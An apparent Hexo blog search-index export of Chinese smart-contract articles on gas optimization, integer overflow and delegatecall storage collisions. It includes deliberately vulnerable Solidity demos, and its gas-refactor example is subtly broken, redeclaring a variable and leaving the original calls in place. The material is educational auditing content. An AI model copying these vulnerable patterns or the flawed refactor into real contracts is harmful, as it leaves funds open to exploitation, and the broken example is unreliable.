<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>GAS优化（二）</title>
    <url>/2024/05/18/GAS%E4%BC%98%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h2 id="逻辑优化"><a href="#逻辑优化" class="headerlink" title="逻辑优化"></a>逻辑优化</h2><h3 id="简化代码实现逻辑"><a href="#简化代码实现逻辑" class="headerlink" title="简化代码实现逻辑"></a>简化代码实现逻辑</h3><ul>
<li><p>结合代码上下文，对于可预测的执行结果，没有必要通过代码进行计算，可以进行简化代码，从而节省gas。<br>如以下代码就可以直接设置 num 变量的值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function constantOutcome() public pure returns (uint256) &#123;</span><br><span class="line">    uint256 num = 0;</span><br><span class="line">    for (uint256 i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">        num += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    return num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>当存储变量更新为address(0)时，可直接使用address(0)而不是去读取该存储变量（<strong>此处可能影响代码可读性</strong>）。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">address private _pendingMultiSourceLoanAddress;</span><br><span class="line"></span><br><span class="line">function finalUpdateMultiSourceLoanAddress(address _newAddress) external onlyOwner &#123;</span><br><span class="line">    if (_pendingMultiSourceLoanAddress != _newAddress) &#123;</span><br><span class="line">        revert InvalidAddressUpdateError();</span><br><span class="line">    &#125;</span><br><span class="line">    _multiSourceLoan = MultiSourceLoan(_pendingMultiSourceLoanAddress);</span><br><span class="line">    _pendingMultiSourceLoanAddress = address(0);</span><br><span class="line">    emit MultiSourceLoanUpdated(_pendingMultiSourceLoanAddress);  // 可直接使用address(0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>阅读代码实现的上下文，简化实现逻辑以节省gas。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _createNewFighter(</span><br><span class="line">    address to, </span><br><span class="line">    uint256 dna, </span><br><span class="line">    string memory modelHash,</span><br><span class="line">    string memory modelType, </span><br><span class="line">    uint8 fighterType,</span><br><span class="line">    uint8 iconsType,</span><br><span class="line">    uint256[2] memory customAttributes</span><br><span class="line">) </span><br><span class="line">    private </span><br><span class="line">&#123;  </span><br><span class="line">    require(balanceOf(to) &lt; MAX_FIGHTERS_ALLOWED);</span><br><span class="line">    uint256 element; </span><br><span class="line">    uint256 weight;</span><br><span class="line">    uint256 newDna;    //根据代码中使用的情况，newDna可以删除重构实现逻辑。</span><br><span class="line">    if (customAttributes[0] == 100) &#123;</span><br><span class="line">        (element, weight, newDna) = _createFighterBase(dna, fighterType); // 生成賦值newDna</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        element = customAttributes[0];</span><br><span class="line">        weight = customAttributes[1];</span><br><span class="line">        newDna = dna;</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 newId = fighters.length;</span><br><span class="line"></span><br><span class="line">    bool dendroidBool = fighterType == 1;   </span><br><span class="line">    FighterOps.FighterPhysicalAttributes memory attrs = _aiArenaHelperInstance.createPhysicalAttributes(</span><br><span class="line">        newDna,      //本函数后续代码中，未使用newDna</span><br><span class="line">        generation[fighterType],</span><br><span class="line">        iconsType,</span><br><span class="line">        dendroidBool   // 值为1，导致createPhysicalAttributes()中未真实使用newDna</span><br><span class="line">    );</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function createPhysicalAttributes(</span><br><span class="line">    uint256 dna, </span><br><span class="line">    uint8 generation, </span><br><span class="line">    uint8 iconsType, </span><br><span class="line">    bool dendroidBool</span><br><span class="line">) </span><br><span class="line">    external </span><br><span class="line">    view </span><br><span class="line">    returns (FighterOps.FighterPhysicalAttributes memory) </span><br><span class="line">&#123;</span><br><span class="line">    if (dendroidBool) &#123;  //函数进入当前代码块，当前条件中未使用dna</span><br><span class="line">        return FighterOps.FighterPhysicalAttributes(99, 99, 99, 99, 99, 99);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        ...  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _createFighterBase(</span><br><span class="line">    uint256 dna, </span><br><span class="line">    uint8 fighterType</span><br><span class="line">) </span><br><span class="line">    private </span><br><span class="line">    view </span><br><span class="line">    returns (uint256, uint256, uint256) </span><br><span class="line">&#123;</span><br><span class="line">    uint256 element = dna % numElements[generation[fighterType]];</span><br><span class="line">    uint256 weight = dna % 31 + 65;</span><br><span class="line">    uint256 newDna = fighterType == 0 ? dna : uint256(fighterType);   // 此处赋值newDna</span><br><span class="line">    return (element, weight, newDna);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于以上函数_createNewFighter()中，newDna变量并未真实的使用过，所以可以删除此参数的相关处理，createPhysicalAttributes的newDna参数可以使用其它代替(如dna)；</p>
</li>
</ul>
<h3 id="临时变量的检查优先于存储变量"><a href="#临时变量的检查优先于存储变量" class="headerlink" title="临时变量的检查优先于存储变量"></a>临时变量的检查优先于存储变量</h3><p>由于函数内部开始执行正常逻辑前，会有多个判断条件，常量的判断先于存储变量的判断，在不满足判断的条件下可节省gas。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _checkLiquidatorNft(</span><br><span class="line">    uint256 _nftId,</span><br><span class="line">    uint256 _nftIdLiquidator</span><br><span class="line">)</span><br><span class="line">    internal</span><br><span class="line">    view</span><br><span class="line">&#123;</span><br><span class="line">    if (positionLocked[_nftIdLiquidator] == true) &#123;</span><br><span class="line">        revert LiquidatorIsInPowerFarm();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (_nftIdLiquidator == _nftId) &#123;</span><br><span class="line">        revert InvalidLiquidator();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (_nftIdLiquidator &gt;= POSITION_NFT.getNextExpectedId()) &#123;</span><br><span class="line">        revert InvalidLiquidator();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以将判断条件<code>_nftIdLiquidator == _nftId</code>放置函数的最前端。</p>
<h3 id="避免不必要的状态更新"><a href="#避免不必要的状态更新" class="headerlink" title="避免不必要的状态更新"></a>避免不必要的状态更新</h3><p>当频繁更新存储变量的状态时，应先检查是否曾经更新过，否则跳过更新（写入）操作。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setApprovalForAll(address operator, bool approved) public &#123;</span><br><span class="line">    isApprovedForAll[msg.sender][operator] = approved;</span><br><span class="line">    emit ApprovalForAll(msg.sender, operator, approved);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>优化后</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setApprovalForAll(address operator, bool approved) public &#123;</span><br><span class="line">    if (isApprovedForAll[msg.sender][operator] == approved) return;   //先判断</span><br><span class="line">    isApprovedForAll[msg.sender][operator] = approved;</span><br><span class="line">    emit ApprovalForAll(msg.sender, operator, approved);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="循环中避免昂贵的操作"><a href="#循环中避免昂贵的操作" class="headerlink" title="循环中避免昂贵的操作"></a>循环中避免昂贵的操作</h3><p>应该尽量避免在循环语句中进行昂贵的操作，比如读写存储操作，复杂的计算，外部调用和发送事情等。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setPoolFeeBulk(</span><br><span class="line">    address[] calldata _poolTokens,</span><br><span class="line">    uint256[] calldata _newFees</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyMaster</span><br><span class="line">&#123;</span><br><span class="line">    uint256 i;</span><br><span class="line">    uint256 l = _poolTokens.length;</span><br><span class="line"></span><br><span class="line">    while (i &lt; l) &#123;</span><br><span class="line"></span><br><span class="line">        _checkValue(</span><br><span class="line">            _newFees[i]</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WISE_LENDING.setPoolFee(</span><br><span class="line">            _poolTokens[i],</span><br><span class="line">            _newFees[i]</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit PoolFeeChanged(       </span><br><span class="line">            _poolTokens[i],</span><br><span class="line">            _newFees[i],</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>while循环中发送事件，会消耗更多的gas，应避免这种情况。</p>
<h3 id="循环中避免创建memory变量"><a href="#循环中避免创建memory变量" class="headerlink" title="循环中避免创建memory变量"></a>循环中避免创建memory变量</h3><p>不在循环中创建memory变量，可以减少每次循环创建memory变量的gas成本。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract VarInLoop &#123;</span><br><span class="line">    uint256[] numbers = [1,2,3,4,5];</span><br><span class="line">    uint256 total;</span><br><span class="line">    function double(uint256 num) public pure returns(uint256 ans) &#123;</span><br><span class="line">        ans = num * 2;</span><br><span class="line">    &#125;</span><br><span class="line">    function doubleNumbers() public &#123;</span><br><span class="line">        uint256 len = numbers.length;</span><br><span class="line">        for(uint256 i; i &lt; len; ++i) &#123;</span><br><span class="line">            uint256 doubleNum =  double(numbers[i]);</span><br><span class="line">            total = total + doubleNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>优化后，可节省gas</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract VarOutLoop &#123;</span><br><span class="line">    uint256[] numbers = [1,2,3,4,5];</span><br><span class="line">    uint256 total;</span><br><span class="line">    function double(uint256 num) public pure returns(uint256 ans) &#123;</span><br><span class="line">        ans = num * 2;</span><br><span class="line">    &#125;</span><br><span class="line">    function doubleNumbers() public &#123;</span><br><span class="line">        uint256 len = numbers.length;</span><br><span class="line">        uint256 doubleNum;                //在循环外定义变量</span><br><span class="line">        for(uint256 i; i &lt; len; ++i) &#123;</span><br><span class="line">            doubleNum =  double(numbers[i]);</span><br><span class="line">            total = total + doubleNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><h3 id="重构重复的代码"><a href="#重构重复的代码" class="headerlink" title="重构重复的代码"></a>重构重复的代码</h3><p>重复的代码结合上下文，可通过复用重构实现。<strong>注：这可能会影响程序原有的扩展性。</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimFees(address token) external &#123;</span><br><span class="line">    updateFeeCredit(token, msg.sender);</span><br><span class="line">    uint256 claimable = getClaimableFees(token, msg.sender);</span><br><span class="line">    if (claimable == 0) revert NoFeesToClaim();</span><br><span class="line">    tokensData[token].unclaimedFees[msg.sender] = 0;</span><br><span class="line">    payable(msg.sender).transfer(claimable);</span><br><span class="line">    emit FeesClaimed(token, msg.sender, claimable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function updateFeeCredit(address token, address account) internal &#123;</span><br><span class="line">    TokenData storage data = tokensData[token];</span><br><span class="line">    uint256 balance = balanceOf(token, account);</span><br><span class="line">    if (balance &gt; 0) &#123;</span><br><span class="line">        uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;</span><br><span class="line">        data.unclaimedFees[account] += owed / PRECISION;</span><br><span class="line">        data.userFeeOffset[account] = data.cumulativeFeePerToken;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getClaimableFees(address token, address account) public view returns (uint256) &#123;</span><br><span class="line">    TokenData storage data = tokensData[token];</span><br><span class="line">    uint256 balance = balanceOf(token, account);</span><br><span class="line">    uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;</span><br><span class="line">    return (owed / PRECISION) + data.unclaimedFees[account];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>函数claimFees中调用了2个函数（updateFeeCredit和getClaimableFees），这个2个函数中包含了重复的实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TokenData storage data = tokensData[token];</span><br><span class="line">uint256 balance = balanceOf(token, account);</span><br></pre></td></tr></table></figure></div>
<p>通过重构原来的实现，可节省gas</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimFees(address token) external &#123;</span><br><span class="line">    updateFeeCredit(token, msg.sender);</span><br><span class="line">    uint256 claimable = getClaimableFees(token, msg.sender);</span><br><span class="line">    TokenData storage data = tokensData[token];</span><br><span class="line">    uint256 balance = balanceOf(token, msg.sender);</span><br><span class="line">    if (balance &gt; 0) &#123;</span><br><span class="line">        uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[msg.sender]) * balance;</span><br><span class="line">        data.unclaimedFees[msg.sender] += owed / PRECISION;</span><br><span class="line">        data.userFeeOffset[msg.sender] = data.cumulativeFeePerToken;</span><br><span class="line">   &#125;</span><br><span class="line">    uint256 owed_ = (data.cumulativeFeePerToken - data.userFeeOffset[msg.sender]) * balance;</span><br><span class="line">    uint256 claimable = (owed_ / PRECISION) + data.unclaimedFees[msg.sender];</span><br><span class="line">    if (claimable == 0) revert NoFeesToClaim();</span><br><span class="line">    tokensData[token].unclaimedFees[msg.sender] = 0;</span><br><span class="line">    payable(msg.sender).transfer(claimable);</span><br><span class="line">    emit FeesClaimed(token, msg.sender, claimable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="使用更优的库函数"><a href="#使用更优的库函数" class="headerlink" title="使用更优的库函数"></a>使用更优的库函数</h3><p>将引用库多个函数调用合并为单个操作，利用直接按位操作，可减少多个函数调用相关的开销。<br>如，当前使用的库<code>LiquidityChunkOriginal</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">library LiquidityChunkOriginal &#123;</span><br><span class="line">    function createChunk(</span><br><span class="line">        uint256 self,</span><br><span class="line">        int24 _tickLower,</span><br><span class="line">        int24 _tickUpper,</span><br><span class="line">        uint128 amount</span><br><span class="line">    ) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            return addLiquidity(self, amount) + addTickLower(self, _tickLower) + addTickUpper(self, _tickUpper);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function addLiquidity(uint256 self, uint128 amount) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            return self + uint256(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function addTickLower(uint256 self, int24 _tickLower) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            return self + (uint256(uint24(_tickLower)) &lt;&lt; 232);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function addTickUpper(uint256 self, int24 _tickUpper) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            return self + ((uint256(uint24(_tickUpper))) &lt;&lt; 208);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>优化后的库<code>LiquidityChunkOptimized</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">library LiquidityChunkOptimized &#123;</span><br><span class="line">    function createChunk(</span><br><span class="line">        uint256 self,</span><br><span class="line">        int24 _tickLower,</span><br><span class="line">        int24 _tickUpper,</span><br><span class="line">        uint128 amount</span><br><span class="line">    ) internal pure returns (uint256) &#123;</span><br><span class="line">        return uint256(uint24(_tickLower)) &lt;&lt; 232 | uint256(uint24(_tickUpper)) &lt;&lt; 208 | uint256(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<h3 id="删除多余的代码"><a href="#删除多余的代码" class="headerlink" title="删除多余的代码"></a>删除多余的代码</h3><ul>
<li><p>两次进行函数修改器的调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function depositEth(uint256 _vaultId) external payable vaultExists(_vaultId) vaultExists(_vaultId) &#123;</span><br><span class="line">    _vaultERC20s[ETH][_vaultId] += msg.value;</span><br><span class="line">    emit ERC20Deposited(_vaultId, ETH, msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>重复的处理逻辑</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function placeBid(address _nftAddress, uint256 _tokenId, Auction memory _auction, uint256 _bid)</span><br><span class="line">    external</span><br><span class="line">    nonReentrant</span><br><span class="line">    returns (Auction memory)</span><br><span class="line">&#123;</span><br><span class="line">    _placeBidChecks(_nftAddress, _tokenId, _auction, _bid);</span><br><span class="line">     </span><br><span class="line">    uint256 currentHighestBid = _auction.highestBid;</span><br><span class="line">    // 以下判断在函数_placeBidChecks()中已有处理</span><br><span class="line">    if (_bid == 0 || (currentHighestBid.mulDivDown(_BPS + MIN_INCREMENT_BPS, _BPS) &gt;= _bid)) &#123;</span><br><span class="line">        revert MinBidError(_bid);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _placeBidChecks(address _nftAddress, uint256 _tokenId, Auction memory _auction, uint256 _bid)</span><br><span class="line">    internal</span><br><span class="line">    view</span><br><span class="line">    virtual</span><br><span class="line">&#123;</span><br><span class="line">    _checkAuction(_nftAddress, _tokenId, _auction);</span><br><span class="line">    if (_bid == 0 || (_auction.highestBid.mulDivDown(_BPS + MIN_INCREMENT_BPS, _BPS) &gt;= _bid)) &#123;</span><br><span class="line">        revert MinBidError(_bid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>多余的函数参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function createWithPermit(</span><br><span class="line">    uint256 tokenId,</span><br><span class="line">    address owner,</span><br><span class="line">    address recipient,</span><br><span class="line">    uint256 deadline,</span><br><span class="line">    uint8 v,</span><br><span class="line">    bytes32 r,</span><br><span class="line">    bytes32 s</span><br><span class="line">) external override &#123;</span><br><span class="line">    if (msg.sender != owner) &#123;</span><br><span class="line">        revert Unauthorized();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nonfungiblePositionManager.permit(address(this), tokenId, deadline, v, r, s);</span><br><span class="line">    nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(recipient));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>去掉参数<code>owner</code>，直接使用<code>msg.sender</code>。</p>
</li>
</ul>
<h3 id="仅使用一次的存储变量无需缓存"><a href="#仅使用一次的存储变量无需缓存" class="headerlink" title="仅使用一次的存储变量无需缓存"></a>仅使用一次的存储变量无需缓存</h3><p>当存储变量在当前函数中，只被读取一次，就不用缓存变量进行缓存，导致消耗更多的gas。直接使用即可。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setWhitelist(bytes32 merkleRoot) external &#123;</span><br><span class="line">    uint256 supply = curvesTokenSupply[msg.sender];   //只使用一次</span><br><span class="line">    if (supply &gt; 1) revert CurveAlreadyExists();</span><br><span class="line">    if (presalesMeta[msg.sender].merkleRoot != merkleRoot) &#123;</span><br><span class="line">        presalesMeta[msg.sender].merkleRoot = merkleRoot;</span><br><span class="line">        emit WhitelistUpdated(msg.sender, merkleRoot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="避免死代码"><a href="#避免死代码" class="headerlink" title="避免死代码"></a>避免死代码</h3><p>死代码是指永远也不会执行的代码，例如某个条件永远不可能满足，消耗了以太坊 gas 但没有任何作用。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (balance &lt; 100) &#123;</span><br><span class="line">    if (balance &gt; 300) &#123;</span><br><span class="line">        ...</span><br><span class="line">        return balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <tags>
        <tag>智能合约安全审计</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>整型溢出</title>
    <url>/2023/07/15/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>以太坊虚拟机（EVM）为整型设置了固定大小，因此它只能表示特定范围的数字。当把超过某个数据类型范围的数值保存到这个变量时，就会产生溢出。<br>整型溢出一般分为上溢或下溢，根据运算形式又可以分为：</p>
<ul>
<li>uint8类型变量，值为0时进行减1操作，计算结果会等于255，称为减法溢出；</li>
<li>uint8类型变量，值为255时进行加1操作，计算结果会等于0，称为加法溢出；</li>
<li>uint8类型变量，值为128时进行乘2操作，计算结果会等于0，称为乘法溢出；<br><strong>注：</strong> 由于 solidity 0.8.0 版本之后已内置 Safemath ，此类漏洞很少出现。<br>另外，solidity 0.8.0 版本之后，算术运算有两个计算模式，检查模式（checked）和截断模式（wrapping，也叫不检查模式（unchecked））。默认情况下是检查模式，会进行溢出检查，如果计算结果溢出，会出现失败异常回退；截断模式（不检查模式）在发生溢出的情况下，会进行截断，不会触发异常。</li>
</ul>
<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><ul>
<li><p>Solidity 0.8.0 之前的版本，默认只有截断模式</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.7.5;</span><br><span class="line"></span><br><span class="line">contract Calc &#123;</span><br><span class="line"></span><br><span class="line">    function test() external pure returns(uint8) &#123;</span><br><span class="line">        uint8 a = 255;</span><br><span class="line">        uint8 b = 2;</span><br><span class="line">        return a + b;   // 发出溢出，结果为 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>Solidity 0.8.0 之后的版本</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">contract Calc &#123;</span><br><span class="line"></span><br><span class="line">    function testChecked() external pure returns(uint8) &#123;</span><br><span class="line">        uint8 a = 255;</span><br><span class="line">        uint8 b = 2;</span><br><span class="line">        return a + b;  // 发生异常回退</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testUnchecked() external pure returns(uint8) &#123;</span><br><span class="line">        unchecked &#123;    // 此处慎用，需在确保不可能出现溢出的情况下使用，否则还是会导致溢出。</span><br><span class="line">            uint8 a = 255;</span><br><span class="line">            uint8 b = 2;</span><br><span class="line">            return a + b;   // 发生溢出，结果为 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="安全事件"><a href="#安全事件" class="headerlink" title="安全事件"></a>安全事件</h3><ul>
<li>2018年4月22日，黑客对BEC智能合约发起攻击，凭空取出 57,896,044,618,658,100,000,000,000,000,000,000,000,000,000,000,000,000,000,000.792003956564819968 个BEC代币并在市场上进行抛售，BEC随即急剧贬值，价值几乎为0，该市场瞬间土崩瓦解；</li>
<li>2018年4月25日，SMT项目方发现其交易存在异常，黑客利用其函数漏洞创造了 65,133,050,195,990,400,000,000,000,000,000,000,000,000,000,000,000,000,000,000 + 50,659,039,041,325,800,000,000,000,000,000,000,000,000,000,000,000,000,000,000 的SMT币，火币Pro随即暂停了所有币种的充值提取业务；</li>
<li>2018年12月27日，以太坊智能合约Fountain(FNT)出现整数溢出漏洞，黑客利用其函数漏洞创造了2 + 115792089237316195423570985008687907853269984665640564039457584007913129639935 的SMT币。</li>
</ul>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
<li>Solidity &lt; 0.8.0，使用openzeppelin提供的SafeMath库函数进行数值的加减乘除操作；</li>
<li>Solidity &gt;&#x3D; 0.8.0, Solidity编译器自动集成SafeMath, 直接使用<code>+ - * /</code>即可，发生溢出时会自动回退交易.</li>
</ul>
]]></content>
      <tags>
        <tag>Solidity</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Delegatecall漏洞</title>
    <url>/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="call-和-delegatecall-的区别"><a href="#call-和-delegatecall-的区别" class="headerlink" title="call 和 delegatecall 的区别"></a>call 和 delegatecall 的区别</h3><ul>
<li>call：调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境；</li>
<li>delegatecall：调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境；</li>
</ul>
<h4 id="call"><a href="#call" class="headerlink" title="call"></a>call</h4><img lazyload src="/images/loading.svg" data-src="/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/call_01.jpg" class alt="alt text">
<p>当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。</p>
<h4 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall"></a>delegatecall</h4><img lazyload src="/images/loading.svg" data-src="/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/delegatecall_01.jpg" class alt="alt text">
<p>当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。</p>
<p>另外，当使用 delegatecall 函数进行外部调用涉及到 storage 变量的修改时是根据插槽位置来修改的而不是变量名。如下代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public c;</span><br><span class="line">    address public a;</span><br><span class="line"></span><br><span class="line">    function test() public returns (address b)&#123;</span><br><span class="line">        b = address(this);</span><br><span class="line">        a = b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public a;</span><br><span class="line">    address public c;</span><br><span class="line"></span><br><span class="line">    address Aaddress ;</span><br><span class="line"></span><br><span class="line">    constructor(address _Aaddress) &#123;</span><br><span class="line">        Aaddress = _Aaddress;   // 传入A合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testDelegatecall() public&#123;</span><br><span class="line">        Aaddress.delegatecall(abi.encodeWithSignature(&quot;test()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>A 合约中 address c 存储在 slot0 中，address a 存储在 slot1 中，反之在 B 合约中 address a 存储在 slot0 中，address c 存储在 slot1 中。当我们通过调用 B 合约中的 delegatecall 函数调用 A 合约中的 test 函数时，test 函数修改的是 A 合约中 slot1 这个插槽，所以代码运行的结果是 B 合约中的 address c 被修改了，因为在 B 合约中的 slot1 对应的正是 address c 这个地址存储的位置。</p>
<h3 id="delegatecall-漏洞"><a href="#delegatecall-漏洞" class="headerlink" title="delegatecall 漏洞"></a>delegatecall 漏洞</h3><p>也叫代理合约所有者操纵漏洞，该漏洞允许攻击者操纵代理合约的所有者（下文中B合约为代理合约）。</p>
<p>以下代码中，可以看到有两个合约，A 合约中通过 test() 函数用来修改合约的 owner，在 B 合约中存在 fallback 函数，fallback 函数的内容是使用 delegatecall 去调用 A 合约中的函数。我们通过 Attack 合约，利用 B.fallback() 触发 delegatecall 函数去调用 A.test() 将 B 合约中的 owner 改成 Attack 合约，从而控制 B 合约。</p>
